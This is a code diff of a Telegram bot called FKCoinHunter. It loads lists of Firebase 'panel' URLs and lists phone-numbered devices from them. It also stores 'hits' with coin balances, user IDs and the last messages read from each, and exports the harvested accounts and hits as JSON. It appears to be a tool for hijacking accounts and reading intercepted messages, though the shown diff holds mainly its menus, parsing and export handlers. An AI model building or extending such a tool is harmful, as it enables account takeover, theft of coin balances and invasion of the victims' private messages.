+            "• One per line (<code>#</code> for comments)",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    # Deduplicate
+    seen = set()
+    unique = []
+    for u in urls:
+        if u not in seen:
+            seen.add(u)
+            unique.append(u)
+
+    ctx.user_data['pending_urls'] = unique
+
+    preview_lines = []
+    for u in unique[:10]:
+        short = u if len(u) <= 55 else u[:52] + "…"
+        preview_lines.append(f"• <code>{short}</code>")
+    if len(unique) > 10:
+        preview_lines.append(f"<i>…and {len(unique) - 10} more</i>")
+
+    await update.message.reply_text(
+        f"📋 <b>Found {len(unique)} panel URL(s)</b>\n\n"
+        + "\n".join(preview_lines)
+        + "\n\nAdd these panels?",
+        parse_mode=ParseMode.HTML,
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton(f"✅ Add {len(unique)} Panel(s)",
+                                  callback_data="panel_confirm_add")],
+            [InlineKeyboardButton("❌ Cancel", callback_data="panels_menu")]
+        ])
+    )
 
 
-async def cmd_stop_auto(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    worker.stop()
-    await update.message.reply_text("⏹ Stopped.", reply_markup=main_menu_kb())
-
-
-# ============ CALLBACK HANDLER ============
+# ============ CALLBACK ============
 async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     await q.answer()
     data = q.data
 
+    # ---- Navigation ----
     if data == "menu":
         await q.edit_message_text(
             status_text(), parse_mode=ParseMode.HTML, reply_markup=main_menu_kb()
-        )
-        return
+        ); return
 
     if data == "status":
         await q.edit_message_text(
             status_text(), parse_mode=ParseMode.HTML, reply_markup=main_menu_kb()
-        )
-        return
+        ); return
 
+    if data == "help_menu":
+        await q.edit_message_text(
+            help_text(), parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup([[
+                InlineKeyboardButton("🏠 Menu", callback_data="menu")
+            ]])
+        ); return
+
+    # ---- Automation ----
     if data == "start_auto":
         if not dm.get_current_panel():
-            await q.edit_message_text("⚠️ No panel selected. Add one.", reply_markup=main_menu_kb())
-            return
+            await q.edit_message_text(
+                "⚠️ No panel selected. Add one first.",
+                reply_markup=panels_kb()
+            ); return
         worker.start()
+        await asyncio.sleep(0.3)
         await q.edit_message_text(
-            "🚀 Automation started.\n\n" + status_text(),
-            parse_mode=ParseMode.HTML, reply_markup=main_menu_kb()
-        )
-        return
+            status_text(), parse_mode=ParseMode.HTML, reply_markup=main_menu_kb()
+        ); return
 
     if data == "stop_auto":
         worker.stop()
+        await asyncio.sleep(0.3)
         await q.edit_message_text(
-            "⏹ Stopped.\n\n" + status_text(),
-            parse_mode=ParseMode.HTML, reply_markup=main_menu_kb()
-        )
-        return
+            status_text(), parse_mode=ParseMode.HTML, reply_markup=main_menu_kb()
+        ); return
 
-    # Panels
+    # ---- Panels ----
     if data == "panels_menu":
         await q.edit_message_text(
-            f"📡 <b>Panels</b> ({len(dm.get_panels())})",
+            f"📡 <b>Panel Manager</b>\n"
+            f"Total: <b>{len(dm.get_panels())}</b> • "
+            f"Active: <b>#{dm.current_panel_index + 1 if dm.get_panels() else 0}</b>\n\n"
+            "Tap a panel to make it active.",
             parse_mode=ParseMode.HTML, reply_markup=panels_kb()
-        )
-        return
+        ); return
 
     if data == "panel_add":
+        ctx.user_data['awaiting'] = None
+        await q.edit_message_text(
+            "📥 <b>Add Panels</b>\n\nChoose how to add:",
+            parse_mode=ParseMode.HTML, reply_markup=panel_add_source_kb()
+        ); return
+
+    if data == "panel_add_text":
         ctx.user_data['awaiting'] = 'addpanel'
         await q.edit_message_text(
-            "Send the Firebase panel URL(s) — one per line or comma-separated.",
+            "✍️ <b>Paste panel URL(s)</b>\n\n"
+            "Send one or more URLs (one per line, or comma-separated).\n\n"
+            "Supported:\n"
+            "• <code>https://xxx.firebaseio.com/</code>\n"
+            "• <code>https://...?s=base64</code>",
+            parse_mode=ParseMode.HTML,
             reply_markup=InlineKeyboardMarkup([[
-                InlineKeyboardButton("🔙 Cancel", callback_data="panels_menu")
+                InlineKeyboardButton("🔙 Cancel", callback_data="panel_add")
             ]])
-        )
-        return
+        ); return
+
+    if data == "panel_add_file":
+        await q.edit_message_text(
+            "📁 <b>Upload file</b>\n\n"
+            "Send a <b>.txt</b> file with one URL per line "
+            "(<code>#</code> lines ignored)\n"
+            "or a <b>.json</b> file with an array of URLs.\n\n"
+            "Or use /addpanel — bot will wait for your file.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup([[
+                InlineKeyboardButton("🔙 Cancel", callback_data="panel_add")
+            ]])
+        ); return
+
+    if data == "panel_confirm_add":
+        urls = ctx.user_data.get('pending_urls') or []
+        ctx.user_data['pending_urls'] = None
+        if not urls:
+            await q.edit_message_text(
+                "⚠️ Nothing to add — file was empty or expired.",
+                reply_markup=panels_kb()
+            ); return
+        added, failed = dm.add_databases(urls)
+        await q.edit_message_text(
+            f"✅ <b>Added {added} panel(s)</b>"
+            + (f"\n⚠️ Failed: {failed}" if failed else "")
+            + f"\n\n📡 Total: <b>{len(dm.get_panels())}</b>",
+            parse_mode=ParseMode.HTML, reply_markup=panels_kb()
+        ); return
 
     if data.startswith("panel_view_"):
         idx = int(data.split("_")[-1])
         if dm.set_current_db(idx):
+            p = dm.get_current_panel()
             await q.edit_message_text(
-                f"✅ Selected panel {idx+1}: <b>{dm.get_current_panel().get('name')}</b>",
+                f"✅ <b>Panel activated</b>\n\n"
+                f"📡 <b>{p.get('name')}</b>\n"
+                f"🔗 <code>{p.get('url')}</code>\n"
+                f"🔑 Key: <code>{(p.get('api_key') or 'none')[:20]}…</code>\n"
+                f"📨 Sender: <b>{p.get('sender')}</b>",
                 parse_mode=ParseMode.HTML, reply_markup=panels_kb()
-            )
-        return
+            ); return
+
+    if data.startswith("panel_del_confirm_"):
+        idx = int(data.split("_")[-1])
+        p = dm.get_panels()[idx]
+        await q.edit_message_text(
+            f"🗑 <b>Delete panel?</b>\n\n"
+            f"📡 {p.get('name')}\n"
+            f"🔗 <code>{(p.get('url') or '')[:60]}…</code>",
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🗑 Yes, delete",
+                                      callback_data=f"panel_del_{idx}")],
+                [InlineKeyboardButton("❌ Cancel", callback_data="panels_menu")]
+            ])
+        ); return
 
     if data.startswith("panel_del_"):
         idx = int(data.split("_")[-1])
         dm.remove_database(idx)
         await q.edit_message_text(
-            f"🗑 Removed. Panels left: {len(dm.get_panels())}",
-            reply_markup=panels_kb()
-        )
+            f"🗑 Deleted. Panels left: <b>{len(dm.get_panels())}</b>",
+            parse_mode=ParseMode.HTML, reply_markup=panels_kb()
+        ); return
+
+    if data == "panel_clear_all":
+        if not dm.get_panels():
+            await q.edit_message_text("No panels to clear.", reply_markup=panels_kb())
+            return
+        await q.edit_message_text(
+            f"⚠️ <b>Delete ALL {len(dm.get_panels())} panels?</b>\n"
+            "This cannot be undone.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🗑 Yes, delete all",
+                                      callback_data="panel_clear_all_confirm")],
+                [InlineKeyboardButton("❌ Cancel", callback_data="panels_menu")]
+            ])
+        ); return
+
+    if data == "panel_clear_all_confirm":
+        dm.panels = []
+        dm.current_panel_index = 0
+        dm._save()
+        auto_status['total_panels'] = 0
+        auto_status['panel_index'] = 0
+        await q.edit_message_text("🗑 All panels deleted.", reply_markup=panels_kb())
         return
 
     if data == "panel_next":
-        dm.move_to_next_panel()
-        await q.edit_message_text(
-            f"⏭ Now on panel {dm.current_panel_index+1}/{len(dm.get_panels())}",
-            reply_markup=panels_kb()
-        )
+        if dm.move_to_next_panel():
+            p = dm.get_current_panel()
+            await q.edit_message_text(
+                f"⏭ <b>Panel {dm.current_panel_index+1}/{len(dm.get_panels())}</b>\n\n"
+                f"📡 {p.get('name')}",
+                parse_mode=ParseMode.HTML, reply_markup=panels_kb()
+            )
+        else:
+            await q.edit_message_text("No panels.", reply_markup=panels_kb())
         return
 
     if data == "panel_fetch":
@@ -1280,233 +1580,254 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 parse_mode=ParseMode.HTML, reply_markup=panels_kb()
             )
             return
-        lines = [f"📋 <b>{len(devices)} devices in {panel['name']}</b>\n"]
+        lines = [f"📋 <b>{len(devices)} devices</b> in {panel['name']}\n"]
         for phone, dev in devices[:30]:
-            lines.append(f"📱 <code>{phone}</code> — <i>{dev[:8]}…</i>")
+            lines.append(f"📱 <code>{phone}</code>  <i>{dev[:8]}…</i>")
         if len(devices) > 30:
-            lines.append(f"…and {len(devices)-30} more")
+            lines.append(f"\n<i>…and {len(devices)-30} more</i>")
         await q.edit_message_text(
-            "\n".join(lines),
-            parse_mode=ParseMode.HTML, reply_markup=panels_kb()
-        )
-        return
+            "\n".join(lines), parse_mode=ParseMode.HTML, reply_markup=panels_kb()
+        ); return
 
-    # Hits
+    # ---- Hits ----
     if data == "hits_menu":
-        kb, total, page, _ = hits_kb(0)
+        kb, total, page, _, sort, _ = hits_kb(0)
         await q.edit_message_text(
             f"⭐ <b>Hits</b> — {total} total",
             parse_mode=ParseMode.HTML, reply_markup=kb
-        )
-        return
+        ); return
 
     if data.startswith("hits_page_"):
-        page = int(data.split("_")[-1])
-        kb, total, page, _ = hits_kb(page)
+        _, _, page_s, sort = data.split("_")
+        page = int(page_s)
+        kb, total, page, _, sort, _ = hits_kb(page, sort=sort)
+        total_pages = max(1, (total + 7) // 8)
         await q.edit_message_text(
-            f"⭐ <b>Hits</b> — {total} total (page {page+1})",
+            f"⭐ <b>Hits</b> — {total} total\n"
+            f"<i>Page {page+1}/{total_pages} • sorted by {sort}</i>",
             parse_mode=ParseMode.HTML, reply_markup=kb
-        )
-        return
+        ); return
 
     if data.startswith("hit_view_"):
-        idx = int(data.split("_")[-1])
+        parts = data.split("_")
+        idx, sort = int(parts[2]), parts[3]
         h = am.hit_manager.get_hit(idx)
         if not h:
-            await q.edit_message_text("Not found.", reply_markup=hits_kb(0)[0])
-            return
-        msgs_text = ""
+            await q.edit_message_text("Not found.",
+                                      reply_markup=hits_kb(0)[0]); return
+        msgs = ""
         if h.get('messages'):
             for m in h['messages'][:5]:
-                msgs_text += f"\n• <b>{m['sender']}</b>: {m['text'][:80]}"
+                txt = (m['text'][:80] + "…") if len(m['text']) > 80 else m['text']
+                msgs += f"\n• <b>{m['sender']}</b>: {txt}"
         else:
-            msgs_text = "\n<i>No messages cached.</i>"
+            msgs = "\n<i>No messages cached — tap Refresh.</i>"
         text = (
             f"⭐ <b>Hit #{idx+1}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
             f"📱 <code>{h['phone']}</code>\n"
             f"💰 <b>{h['fk_balance']} FK</b>\n"
-            f"👤 {h.get('username','?')}\n"
-            f"🆔 UID: <code>{h.get('user_id','?')}</code>\n"
-            f"📅 {h.get('created_at','?')[:19]}\n"
-            f"📡 Panel: <code>{h.get('firebase_url','?')[:40]}…</code>\n"
-            f"📨 <b>Last 5 messages:</b>{msgs_text}"
+            f"👤 {h.get('username', '?')}\n"
+            f"🆔 UID: <code>{h.get('user_id', '?')}</code>\n"
+            f"📅 {h.get('created_at', '?')[:19]}\n"
+            f"📡 Panel: <code>{(h.get('firebase_url') or '?')[:40]}…</code>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"📨 <b>Last 5 messages:</b>{msgs}"
         )
         await q.edit_message_text(
             text, parse_mode=ParseMode.HTML,
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("🔄 Refresh Messages",
-                                      callback_data=f"hit_refresh_{idx}")],
-                [InlineKeyboardButton("🔙 Back to Hits", callback_data="hits_menu")]
+                                      callback_data=f"hit_refresh_{idx}_{sort}")],
+                [InlineKeyboardButton("🔙 Back",
+                                      callback_data=f"hits_page_0_{sort}")]
             ])
-        )
-        return
+        ); return
 
     if data.startswith("hit_refresh_"):
-        idx = int(data.split("_")[-1])
+        parts = data.split("_")
+        idx, sort = int(parts[2]), parts[3]
         await q.answer("Refreshing…")
-        msgs = am.hit_manager.refresh_messages(idx)
+        am.hit_manager.refresh_messages(idx)
         h = am.hit_manager.get_hit(idx)
         if not h:
             return
-        msgs_text = ""
-        if msgs:
-            for m in msgs:
-                msgs_text += f"\n• <b>{m['sender']}</b>: {m['text'][:80]}"
+        msgs = ""
+        if h.get('messages'):
+            for m in h['messages'][:5]:
+                txt = (m['text'][:80] + "…") if len(m['text']) > 80 else m['text']
+                msgs += f"\n• <b>{m['sender']}</b>: {txt}"
         else:
-            msgs_text = "\n<i>No messages found.</i>"
+            msgs = "\n<i>No messages found.</i>"
         text = (
             f"⭐ <b>Hit #{idx+1}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
             f"📱 <code>{h['phone']}</code>\n"
             f"💰 <b>{h['fk_balance']} FK</b>\n"
-            f"👤 {h.get('username','?')}\n"
-            f"📨 <b>Last 5 messages (refreshed):</b>{msgs_text}"
+            f"👤 {h.get('username', '?')}\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"📨 <b>Last 5 messages (refreshed):</b>{msgs}"
         )
         await q.edit_message_text(
             text, parse_mode=ParseMode.HTML,
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("🔄 Refresh Again",
-                                      callback_data=f"hit_refresh_{idx}")],
-                [InlineKeyboardButton("🔙 Back to Hits", callback_data="hits_menu")]
+                                      callback_data=f"hit_refresh_{idx}_{sort}")],
+                [InlineKeyboardButton("🔙 Back",
+                                      callback_data=f"hits_page_0_{sort}")]
             ])
-        )
-        return
+        ); return
 
-    # Accounts
+    # ---- Accounts ----
     if data == "accounts_menu":
         kb, lines, total, page, _ = accounts_kb(0)
         await q.edit_message_text(
-            f"👤 <b>Accounts</b> — {total} total (page 1)\n\n" +
-            ("\n".join(lines) if lines else "No accounts."),
+            f"👤 <b>Accounts</b> — {total} total\n\n" +
+            ("\n".join(lines) if lines else "<i>No accounts yet.</i>"),
             parse_mode=ParseMode.HTML, reply_markup=kb
-        )
-        return
+        ); return
 
     if data.startswith("acc_page_"):
         page = int(data.split("_")[-1])
         kb, lines, total, page, _ = accounts_kb(page)
+        total_pages = max(1, (total + 7) // 8)
         await q.edit_message_text(
-            f"👤 <b>Accounts</b> — {total} total (page {page+1})\n\n" +
-            ("\n".join(lines) if lines else "No accounts."),
+            f"👤 <b>Accounts</b> — {total} total\n"
+            f"<i>Page {page+1}/{total_pages}</i>\n\n" +
+            ("\n".join(lines) if lines else "<i>No accounts.</i>"),
             parse_mode=ParseMode.HTML, reply_markup=kb
-        )
-        return
+        ); return
 
-    # Logs
-    if data == "logs_menu":
-        logs = auto_status['processing_logs'][-30:]
-        text = "📜 <b>Last 30 logs</b>\n" + "\n".join(
-            f"<code>{l['timestamp']}</code> [{l['type']}] {l['message']}"
-            for l in logs
-        ) if logs else "📜 No logs yet."
-        if len(text) > 4000:
-            text = text[-4000:]
+    # ---- Logs ----
+    if data == "logs_menu" or data.startswith("logs_filter_"):
+        filter_type = data.replace("logs_filter_", "") if data.startswith("logs_filter_") else "all"
+        logs = auto_status['processing_logs']
+        if filter_type != "all":
+            logs = [l for l in logs if l['type'] == filter_type]
+        logs = logs[-30:]
+        title = f"📜 <b>Logs</b> ({filter_type})"
+        body = title + "\n\n" + (
+            "\n".join(
+                f"<code>{l['timestamp']}</code> {l['message'][:100]}"
+                for l in logs
+            ) if logs else "<i>No logs.</i>"
+        )
+        if len(body) > 3800:
+            body = body[-3800:]
         await q.edit_message_text(
-            text, parse_mode=ParseMode.HTML,
-            reply_markup=InlineKeyboardMarkup([[
-                InlineKeyboardButton("🔄 Refresh", callback_data="logs_menu"),
-                InlineKeyboardButton("🔙 Back", callback_data="menu")
-            ]])
-        )
-        return
+            body, parse_mode=ParseMode.HTML, reply_markup=logs_kb(filter_type)
+        ); return
 
-    # Export
+    if data == "logs_clear":
+        auto_status['processing_logs'] = []
+        await q.edit_message_text("🗑 Logs cleared.",
+                                  reply_markup=logs_kb('all')); return
+
+    # ---- Export ----
     if data == "export_menu":
         await q.edit_message_text(
-            "📤 <b>Export</b>",
+            "📤 <b>Export Data</b>\n\nChoose what to download:",
             parse_mode=ParseMode.HTML,
             reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("📄 Accounts JSON", callback_data="export_acc")],
-                [InlineKeyboardButton("⭐ Hits JSON", callback_data="export_hits")],
+                [InlineKeyboardButton("📄 Accounts JSON",
+                                      callback_data="export_acc")],
+                [InlineKeyboardButton("⭐ Hits JSON",
+                                      callback_data="export_hits")],
                 [InlineKeyboardButton("🔙 Back", callback_data="menu")]
             ])
-        )
-        return
+        ); return
 
     if data == "export_acc":
         if not am.accounts:
-            await q.answer("No accounts.", show_alert=True)
-            return
+            await q.answer("No accounts.", show_alert=True); return
         path = os.path.join(DATA_DIR, f"accounts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
         with open(path, 'w', encoding='utf-8') as f:
             json.dump([a.to_dict() for a in am.accounts], f, indent=2, ensure_ascii=False)
-        await q.message.reply_document(document=InputFile(path), filename=os.path.basename(path))
-        os.remove(path)
-        return
+        await q.message.reply_document(document=InputFile(path),
+                                       filename=os.path.basename(path))
+        os.remove(path); return
 
     if data == "export_hits":
         hits = am.hit_manager.get_hits()
         if not hits:
-            await q.answer("No hits.", show_alert=True)
-            return
+            await q.answer("No hits.", show_alert=True); return
         path = os.path.join(DATA_DIR, f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
         with open(path, 'w', encoding='utf-8') as f:
             json.dump(hits, f, indent=2, ensure_ascii=False)
-        await q.message.reply_document(document=InputFile(path), filename=os.path.basename(path))
-        os.remove(path)
-        return
+        await q.message.reply_document(document=InputFile(path),
+                                       filename=os.path.basename(path))
+        os.remove(path); return
 
 
-# ============ FREE-TEXT HANDLER ============
+# ============ TEXT HANDLER ============
 async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     state = ctx.user_data.get('awaiting')
     if state == 'addpanel':
         ctx.user_data['awaiting'] = None
         text = update.message.text or ""
-        urls = [u.strip() for u in re.split(r'[\n,]+', text) if u.strip()]
+        urls = parse_urls_from_text(text)
+        if not urls:
+            # fallback: split by comma/space
+            urls = [u.strip() for u in re.split(r'[\s,]+', text) if u.strip()]
         if not urls:
             await update.message.reply_text("❌ No URLs found.")
             return
-        n = dm.add_databases(urls)
-        await update.message.reply_text(
-            f"✅ Added <b>{n}</b> panel(s). Total: <b>{len(dm.get_panels())}</b>",
-            parse_mode=ParseMode.HTML,
-            reply_markup=InlineKeyboardMarkup([[
-                InlineKeyboardButton("📡 View Panels", callback_data="panels_menu")
-            ]])
+        seen = set()
+        unique = [u for u in urls if not (u in seen or seen.add(u))]
+        ctx.user_data['pending_urls'] = unique
+        preview = "\n".join(
+            f"• <code>{(u if len(u) <= 55 else u[:52] + '…')}</code>"
+            for u in unique[:10]
         )
+        extra = f"\n<i>…and {len(unique)-10} more</i>" if len(unique) > 10 else ""
+        await update.message.reply_text(
+            f"📋 <b>Found {len(unique)} URL(s)</b>\n\n{preview}{extra}\n\nAdd?",
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton(f"✅ Add {len(unique)}",
+                                      callback_data="panel_confirm_add")],
+                [InlineKeyboardButton("❌ Cancel", callback_data="panels_menu")]
+            ])
+        )
+        return
 
 
-# ============ HEALTH CHECK (for Railway) ============
+# ============ HEALTH (Railway) ============
 class HealthHandler(BaseHTTPRequestHandler):
     def do_GET(self):
-        self.send_response(200)
-        self.end_headers()
+        self.send_response(200); self.end_headers()
         self.wfile.write(b"OK")
-    def log_message(self, *args):
+    def log_message(self, *a):
         pass
 
 
 def start_health_server():
     port = int(os.getenv("PORT", "8080"))
     try:
-        server = HTTPServer(('0.0.0.0', port), HealthHandler)
-        server.serve_forever()
+        HTTPServer(('0.0.0.0', port), HealthHandler).serve_forever()
     except Exception as e:
-        logger.error(f"health server: {e}")
+        logger.error(f"health: {e}")
 
 
-# ============ POST INIT ============
 async def post_init(application: Application):
     global bot_app, main_loop, admin_chat_id
     bot_app = application
     main_loop = asyncio.get_running_loop()
     if ADMIN_ID:
         admin_chat_id = ADMIN_ID
-        logger.info(f"Admin chat_id set from env: {ADMIN_ID}")
+        logger.info(f"Admin: {ADMIN_ID}")
     logger.info("Bot initialized.")
 
 
-# ============ MAIN ============
 def main():
     if not BOT_TOKEN:
-        print("❌ BOT_TOKEN env var required!")
-        sys.exit(1)
+        print("❌ BOT_TOKEN required!"); sys.exit(1)
 
-    # Health server for Railway
     threading.Thread(target=start_health_server, daemon=True).start()
 
     app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
 
+    # Commands
     app.add_handler(CommandHandler("start", cmd_start))
     app.add_handler(CommandHandler("help", cmd_help))
     app.add_handler(CommandHandler("status", cmd_status))
@@ -1519,7 +1840,10 @@ def main():
     app.add_handler(CommandHandler("stop_auto", cmd_stop_auto))
     app.add_handler(CommandHandler("export_accounts", cmd_export_accounts))
     app.add_handler(CommandHandler("export_hits", cmd_export_hits))
+
+    # Buttons / files / text
     app.add_handler(CallbackQueryHandler(on_callback))
+    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
 
     logger.info("🦅 FKCoinHunter Bot starting…")
